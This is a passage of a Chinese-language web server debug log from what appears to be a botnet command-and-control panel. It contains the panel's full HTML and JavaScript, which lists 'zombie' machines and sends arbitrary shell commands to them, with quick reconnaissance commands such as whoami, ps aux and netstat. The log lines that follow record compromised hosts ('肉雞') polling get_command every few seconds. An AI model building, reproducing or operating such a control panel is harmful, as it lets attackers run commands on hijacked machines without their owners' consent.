顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:35:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:35:28 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:35:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:35:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:28] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:35:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:29 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:29] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:29 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:29] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:30 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:30] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:30 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:30] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:35:30 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:35:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:35:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:30] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:35:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:33] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:33] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:38] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:38] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:43] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:43] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:48] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:48] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:53] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:53] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:58] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:35:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:35:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:35:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:35:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:35:58] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:03] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:03] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:08] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:08] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:13] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:13] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:18] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:18] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:23] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:23] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:28] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:28] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:33] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:33] "GET /api/control/get_command HTTP/1.1" 200 -
